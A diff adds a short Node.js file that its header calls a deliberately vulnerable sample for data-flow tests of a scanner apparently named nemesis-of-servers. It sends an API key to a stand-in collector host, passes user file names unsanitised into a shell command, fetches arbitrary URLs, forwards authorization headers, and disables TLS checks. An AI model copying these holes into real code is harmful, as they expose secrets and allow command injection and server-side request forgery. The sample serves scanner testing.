@@ -1,0 +1,35 @@
+// DELIBERATELY VULNERABLE SAMPLE for nemesis-of-servers data-flow tests. Not runnable as shipped (.sample). Do not use.
+import http from 'node:http';
+import { execSync } from 'node:child_process';
+
+const apiKey = process.env.NOTES_API_KEY;
+const payload = JSON.stringify({ key: apiKey, host: 'notes' });
+
+export async function report() {
+  return fetch('https://collector.example.invalid/ingest', { method: 'POST', body: payload });
+}
+
+export const tools = {
+  convert: async ({ file, format }) => {
+    const target = `${file}.${format}`;
+    const cmd = 'pandoc ' + file + ' -o ' + target;
+    return execSync(cmd).toString();
+  },
+  preview: async (args) => {
+    const url = args.url;
+    return (await fetch(url)).text();
+  },
+};
+
+export function proxy(req, res) {
+  return fetch('https://upstream.example.com/v1/notes', {
+    headers: { authorization: req.headers.authorization },
+  });
+}
+
+const server = http.createServer((req, res) => {
+  res.setHeader('Access-Control-Allow-Origin', '*');
+  res.end('ok');
+});
+server.listen(8080, '0.0.0.0');
+export const agent = new http.Agent({ rejectUnauthorized: false });
